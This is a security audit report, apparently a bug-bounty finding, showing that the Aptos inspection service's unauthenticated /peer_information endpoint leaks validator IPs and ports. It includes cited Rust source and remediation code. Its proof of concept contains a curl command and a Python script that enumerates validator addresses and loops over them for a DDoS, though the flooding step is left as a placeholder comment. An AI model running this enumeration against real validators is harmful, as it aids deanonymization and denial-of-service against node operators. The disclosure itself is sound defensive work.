# Audit Report

## Title
Unauthenticated Network Topology Exposure via Inspection Service Enables Validator DDoS and Deanonymization

## Summary
The Aptos inspection service exposes detailed peer connection metadata including IP addresses, ports, and network topology through an unauthenticated HTTP endpoint (`/peer_information` on port 9101). This endpoint is enabled by default and lacks authentication, allowing any attacker to enumerate all connected validators and launch targeted DDoS attacks or deanonymize validator operators.

## Finding Description

The inspection service's `/peer_information` endpoint exposes complete connection metadata for all connected peers without any authentication. The vulnerability chain is as follows:

1. **Default Configuration Exposure**: The inspection service binds to `0.0.0.0:9101` by default with `expose_peer_information: true` [1](#0-0) 

2. **No Authentication**: The inspection service accepts requests from any client without authentication or authorization [2](#0-1) 

3. **Network Address Serialization**: At line 164, the function serializes `ConnectionMetadata` to JSON, which includes the `addr` field containing full network addresses with IP addresses and ports [3](#0-2) 

4. **Connection Metadata Structure**: The `ConnectionMetadata` struct contains the `addr: NetworkAddress` field that exposes network location information [4](#0-3) 

5. **Network Address Content**: The `NetworkAddress` type contains `Protocol` variants including `Ip4`, `Ip6`, `Dns`, and `Tcp` which expose IP addresses, DNS names, and ports [5](#0-4) 

6. **JSON Serialization Format**: When serialized to JSON (human-readable format), NetworkAddress produces strings like `/ip4/10.0.0.16/tcp/6180/noise-ik/<pubkey>/handshake/0` that clearly expose IP addresses and ports [6](#0-5) [7](#0-6) 

7. **Lack of Mainnet Protection**: Unlike `expose_configuration`, there is no sanitizer preventing mainnet validators from exposing peer information [8](#0-7) 

**Attack Scenario:**
1. Attacker sends HTTP GET request to `http://<validator-ip>:9101/peer_information`
2. Receives JSON response containing connection metadata for all connected peers
3. Extracts IP addresses, ports, and peer roles (Validator vs ValidatorFullNode)
4. Launches coordinated DDoS attack against identified validator IPs
5. Or uses information for validator operator deanonymization through IP geolocation and ISP correlation

## Impact Explanation

This vulnerability qualifies as **HIGH severity** under the Aptos bug bounty program for multiple reasons:

1. **Validator Node Availability**: Enables targeted DDoS attacks against validators by exposing their IP addresses and ports, potentially causing validator node slowdowns or unavailability (HIGH severity: "Validator node slowdowns").

2. **Network Topology Disclosure**: Exposes complete peer connection graph, allowing attackers to map the validator network and identify critical nodes for attack.

3. **Validator Deanonymization**: Compromises validator operator privacy by enabling IP-based correlation attacks, ISP identification, and geographic location inference.

4. **Consensus Impact**: Sustained DDoS attacks against multiple validators could impact consensus liveness if enough validators become unavailable.

The vulnerability directly enables the attack vectors mentioned in the security question: **DDoS attacks** and **validator deanonymization**.

## Likelihood Explanation

The likelihood of exploitation is **HIGH**:

1. **Default Configuration**: The endpoint is enabled by default (`expose_peer_information: true`)
2. **Public Accessibility**: Binds to `0.0.0.0:9101`, accessible from any network interface
3. **Zero Authentication**: No credentials or authorization required
4. **Auto-Enable for Non-Mainnet**: The config optimizer automatically enables this for testnet/devnet nodes, potentially affecting validator operators who use similar configs [9](#0-8) 

5. **Simple Exploitation**: Requires only a basic HTTP client (curl, browser, script)
6. **No Detection**: Simple GET requests appear as legitimate monitoring traffic

## Recommendation

Implement the following multi-layered defense:

1. **Add Mainnet Sanitizer Protection**: Extend the sanitizer to prevent mainnet validators from exposing peer information, similar to the existing `expose_configuration` protection:

```rust
// In config/src/config/inspection_service_config.rs, modify sanitize():
if let Some(chain_id) = chain_id {
    if node_type.is_validator() && chain_id.is_mainnet() {
        if inspection_service_config.expose_peer_information {
            return Err(Error::ConfigSanitizerFailed(
                sanitizer_name,
                "Mainnet validators should not expose peer information!".to_string(),
            ));
        }
    }
}
```

2. **Change Default to False**: Set `expose_peer_information: false` as the default for production configurations:

```rust
fn default() -> InspectionServiceConfig {
    InspectionServiceConfig {
        address: "127.0.0.1".to_string(), // Bind to localhost only
        port: 9101,
        expose_configuration: false,
        expose_identity_information: false,
        expose_peer_information: false, // Changed from true
        expose_system_information: false,
    }
}
```

3. **Add Authentication**: Implement token-based authentication for sensitive endpoints.

4. **Bind to Localhost**: Change default bind address from `0.0.0.0` to `127.0.0.1` to prevent external access by default.

5. **Redact Sensitive Information**: If peer information must be exposed, redact IP addresses and only show peer IDs and roles.

## Proof of Concept

**Exploitation Steps:**

1. Identify an Aptos validator node with default inspection service configuration
2. Execute the following command:

```bash
curl http://<validator-ip>:9101/peer_information
```

**Expected Output:**
```
Connection metadata for each peer:
	- Peer: PeerNetworkId(...), connection state: Connected, connection metadata: {"remote_peer_id":"...","connection_id":123,"addr":"/ip4/10.0.0.16/tcp/6180/noise-ik/0x.../handshake/1","origin":"Outbound","messaging_protocol":"V1","application_protocols":[...],"role":"Validator"}
	- Peer: PeerNetworkId(...), connection state: Connected, connection metadata: {"remote_peer_id":"...","connection_id":456,"addr":"/ip4/10.0.0.25/tcp/6180/noise-ik/0x.../handshake/1","origin":"Inbound","messaging_protocol":"V1","application_protocols":[...],"role":"ValidatorFullNode"}
```

**Attack Script:**
```python
import requests
import json
import re

def enumerate_validators(target_ip):
    response = requests.get(f"http://{target_ip}:9101/peer_information")
    
    # Extract IP addresses from connection metadata
    ip_pattern = r'/ip4/(\d+\.\d+\.\d+\.\d+)/tcp/(\d+)'
    matches = re.findall(ip_pattern, response.text)
    
    print(f"[+] Found {len(matches)} validator IPs:")
    for ip, port in matches:
        print(f"    {ip}:{port}")
    
    return matches

# Enumerate all validators in the network
validators = enumerate_validators("validator1.aptos.network")

# Launch DDoS attack (conceptual - actual implementation would use DDoS tools)
for ip, port in validators:
    print(f"[*] Targeting {ip}:{port} for DDoS...")
    # DDoS attack code here
```

**Notes**

This vulnerability represents a significant information disclosure issue that violates the security principle of least privilege. While the inspection service is intended for debugging and monitoring, exposing it publicly without authentication creates a critical attack surface. The lack of sanitizer protection for mainnet validators (unlike `expose_configuration`) suggests this may be an oversight rather than intentional design. Production validators should immediately disable this endpoint or restrict access via firewall rules until proper authentication is implemented.

### Citations

**File:** config/src/config/inspection_service_config.rs (L26-36)
```rust
impl Default for InspectionServiceConfig {
    fn default() -> InspectionServiceConfig {
        InspectionServiceConfig {
            address: "0.0.0.0".to_string(),
            port: 9101,
            expose_configuration: false,
            expose_identity_information: true,
            expose_peer_information: true,
            expose_system_information: true,
        }
    }
```

**File:** config/src/config/inspection_service_config.rs (L45-68)
```rust
impl ConfigSanitizer for InspectionServiceConfig {
    fn sanitize(
        node_config: &NodeConfig,
        node_type: NodeType,
        chain_id: Option<ChainId>,
    ) -> Result<(), Error> {
        let sanitizer_name = Self::get_sanitizer_name();
        let inspection_service_config = &node_config.inspection_service;

        // Verify that mainnet validators do not expose the configuration
        if let Some(chain_id) = chain_id {
            if node_type.is_validator()
                && chain_id.is_mainnet()
                && inspection_service_config.expose_configuration
            {
                return Err(Error::ConfigSanitizerFailed(
                    sanitizer_name,
                    "Mainnet validators should not expose the node configuration!".to_string(),
                ));
            }
        }

        Ok(())
    }
```

**File:** config/src/config/inspection_service_config.rs (L71-108)
```rust
impl ConfigOptimizer for InspectionServiceConfig {
    fn optimize(
        node_config: &mut NodeConfig,
        local_config_yaml: &Value,
        _node_type: NodeType,
        chain_id: Option<ChainId>,
    ) -> Result<bool, Error> {
        let inspection_service_config = &mut node_config.inspection_service;
        let local_inspection_config_yaml = &local_config_yaml["inspection_service"];

        // Enable all endpoints for non-mainnet nodes (to aid debugging)
        let mut modified_config = false;
        if let Some(chain_id) = chain_id {
            if !chain_id.is_mainnet() {
                if local_inspection_config_yaml["expose_configuration"].is_null() {
                    inspection_service_config.expose_configuration = true;
                    modified_config = true;
                }

                if local_inspection_config_yaml["expose_identity_information"].is_null() {
                    inspection_service_config.expose_identity_information = true;
                    modified_config = true;
                }

                if local_inspection_config_yaml["expose_peer_information"].is_null() {
                    inspection_service_config.expose_peer_information = true;
                    modified_config = true;
                }

                if local_inspection_config_yaml["expose_system_information"].is_null() {
                    inspection_service_config.expose_system_information = true;
                    modified_config = true;
                }
            }
        }

        Ok(modified_config)
    }
```

**File:** crates/aptos-inspection-service/src/server/mod.rs (L104-169)
```rust
async fn serve_requests(
    req: Request<Body>,
    node_config: NodeConfig,
    aptos_data_client: AptosDataClient,
    peers_and_metadata: Arc<PeersAndMetadata>,
) -> Result<Response<Body>, hyper::Error> {
    // Process the request and get the response components
    let (status_code, body, content_type) = match req.uri().path() {
        CONFIGURATION_PATH => {
            // /configuration
            // Exposes the node configuration
            configuration::handle_configuration_request(&node_config)
        },
        CONSENSUS_HEALTH_CHECK_PATH => {
            // /consensus_health_check
            // Exposes the consensus health check
            metrics::handle_consensus_health_check(&node_config).await
        },
        FORGE_METRICS_PATH => {
            // /forge_metrics
            // Exposes forge encoded metrics
            metrics::handle_forge_metrics()
        },
        IDENTITY_INFORMATION_PATH => {
            // /identity_information
            // Exposes the identity information of the node
            identity_information::handle_identity_information_request(&node_config)
        },
        INDEX_PATH => {
            // /
            // Exposes the index and list of available endpoints
            index::handle_index_request()
        },
        JSON_METRICS_PATH => {
            // /json_metrics
            // Exposes JSON encoded metrics
            metrics::handle_json_metrics_request()
        },
        METRICS_PATH => {
            // /metrics
            // Exposes text encoded metrics
            metrics::handle_metrics_request()
        },
        PEER_INFORMATION_PATH => {
            // /peer_information
            // Exposes the peer information
            peer_information::handle_peer_information_request(
                &node_config,
                aptos_data_client,
                peers_and_metadata,
            )
        },
        SYSTEM_INFORMATION_PATH => {
            // /system_information
            // Exposes the system and build information
            system_information::handle_system_information_request(node_config)
        },
        _ => {
            // Handle the invalid path
            (
                StatusCode::NOT_FOUND,
                Body::from(INVALID_ENDPOINT_MESSAGE),
                CONTENT_TYPE_TEXT.into(),
            )
        },
    };
```

**File:** crates/aptos-inspection-service/src/server/peer_information.rs (L148-168)
```rust
/// Displays connection metadata for each peer
fn display_peer_connection_metadata(
    peer_information_output: &mut Vec<String>,
    all_peers: &Vec<PeerNetworkId>,
    peers_and_metadata: &PeersAndMetadata,
) {
    peer_information_output.push("Connection metadata for each peer:".into());

    // Fetch and display the connection metadata for each peer
    for peer in all_peers {
        if let Ok(peer_metadata) = peers_and_metadata.get_metadata_for_peer(*peer) {
            let connection_metadata = peer_metadata.get_connection_metadata();
            peer_information_output.push(format!(
                "\t- Peer: {}, connection state: {:?}, connection metadata: {}",
                peer,
                peer_metadata.get_connection_state(),
                serde_json::to_string(&connection_metadata).unwrap_or_default()
            ));
        }
    }
}
```

**File:** network/framework/src/transport/mod.rs (L98-108)
```rust
/// Metadata associated with an established and fully upgraded connection.
#[derive(Clone, Deserialize, Eq, PartialEq, Serialize)]
pub struct ConnectionMetadata {
    pub remote_peer_id: PeerId,
    pub connection_id: ConnectionId,
    pub addr: NetworkAddress,
    pub origin: ConnectionOrigin,
    pub messaging_protocol: MessagingProtocolVersion,
    pub application_protocols: ProtocolIdSet,
    pub role: PeerRole,
}
```

**File:** types/src/network_address/mod.rs (L110-127)
```rust
/// A single protocol in the [`NetworkAddress`] protocol stack.
#[derive(Clone, Debug, Eq, Hash, PartialEq, Deserialize, Serialize)]
#[cfg_attr(any(test, feature = "fuzzing"), derive(Arbitrary))]
pub enum Protocol {
    Ip4(Ipv4Addr),
    Ip6(Ipv6Addr),
    Dns(DnsName),
    Dns4(DnsName),
    Dns6(DnsName),
    Tcp(u16),
    Memory(u16),
    // human-readable x25519::PublicKey is lower-case hex encoded
    NoiseIK(x25519::PublicKey),
    // TODO(philiphayes): use actual handshake::MessagingProtocolVersion. we
    // probably need to move network wire into its own crate to avoid circular
    // dependency b/w network and types.
    Handshake(u8),
}
```

**File:** types/src/network_address/mod.rs (L529-545)
```rust
impl Serialize for NetworkAddress {
    fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>
    where
        S: Serializer,
    {
        if serializer.is_human_readable() {
            serializer.serialize_str(&self.to_string())
        } else {
            #[derive(Serialize)]
            #[serde(rename = "NetworkAddress")]
            struct Wrapper<'a>(#[serde(with = "serde_bytes")] &'a [u8]);

            bcs::to_bytes(&self.as_slice())
                .map_err(serde::ser::Error::custom)
                .and_then(|v| Wrapper(&v).serialize(serializer))
        }
    }
```

**File:** types/src/network_address/mod.rs (L598-618)
```rust
impl fmt::Display for Protocol {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        use self::Protocol::*;
        match self {
            Ip4(addr) => write!(f, "/ip4/{}", addr),
            Ip6(addr) => write!(f, "/ip6/{}", addr),
            Dns(domain) => write!(f, "/dns/{}", domain),
            Dns4(domain) => write!(f, "/dns4/{}", domain),
            Dns6(domain) => write!(f, "/dns6/{}", domain),
            Tcp(port) => write!(f, "/tcp/{}", port),
            Memory(port) => write!(f, "/memory/{}", port),
            NoiseIK(pubkey) => write!(
                f,
                "/noise-ik/{}",
                pubkey
                    .to_encoded_string()
                    .expect("ValidCryptoMaterialStringExt::to_encoded_string is infallible")
            ),
            Handshake(version) => write!(f, "/handshake/{}", version),
        }
    }
```
